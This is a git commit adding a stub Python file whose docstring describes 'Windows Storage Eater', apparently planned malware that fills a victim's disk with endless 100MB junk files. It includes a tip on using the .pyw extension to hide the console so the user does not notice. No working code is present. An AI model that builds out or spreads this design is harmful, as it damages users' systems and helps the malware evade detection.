f52ab250b987ba4c0ccc7998c953547ce35be80f
Rishav Das <61372472+rdofficial@users.noreply.github.com>
2021-05-03 15:59:55 +0530

    Created windows-storage-eater.py file + added the commented docs to it
    In this commit, we have did the following stuff :
    1. Firstly, we created the windows-storage-eater.py script file.
    2. Added the commented docs to the created script file.
    PS : The actual code for the script to act like a malicious software will be updated soon enough by the original author ( @rdofficial ).

---
+++ python/windows-storae-eater.py
@@ -0,0 +1,16 @@
+"""
+Windows Storage Eater
+
+This python3 script creates too many files in a single folder, the script is currently made for the windows operating system, as the algorithms used here are based on the storage and division that the windows operating system does. The script runs an infinite loop of creation of a 100MB useless binary file. Also, for making the console screen disappear while the execution time, replace the extension with ".pyw" to hide the terminal (console) screen while the execution. Thus, the malware has now more chances of being undetectable by the user.
+
+Author : Rishav Das (https://github.com/rdofficial/)
+Created on : May 3, 2021
+
+Last modified by : -
+Last modified on : -
+
+Authors contributed to this script (Add your name below if you have contributed) :
+1. Rishav Das (github:https://github.com/rdofficial/, email:rdofficial192@gmail.com)
+"""
+
+# Code to be added later
